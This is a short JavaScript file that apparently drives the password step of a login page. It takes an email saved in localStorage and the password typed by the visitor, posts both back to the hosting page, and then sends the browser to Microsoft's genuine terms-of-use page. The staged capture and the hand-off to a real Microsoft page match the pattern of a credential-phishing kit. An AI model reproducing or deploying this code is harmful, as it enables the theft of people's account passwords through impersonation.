let submit, cbText;
document.addEventListener("DOMContentLoaded", async ()=>{
    
    const password = document.querySelector("input#password");
    password.value && (password.value = "")

    document.querySelector("form").addEventListener("submit", async e =>{
        e.preventDefault();
        
        
        const obj = {
            email: localStorage.getItem("email"),
            password: password.value
        }

        const data = await fetchResourse(obj,window.location.href,"POST");
        
        if(data.status) window.location.href = `https://www.microsoft.com/en-us/legal/terms-of-use`
        

    })
    

})
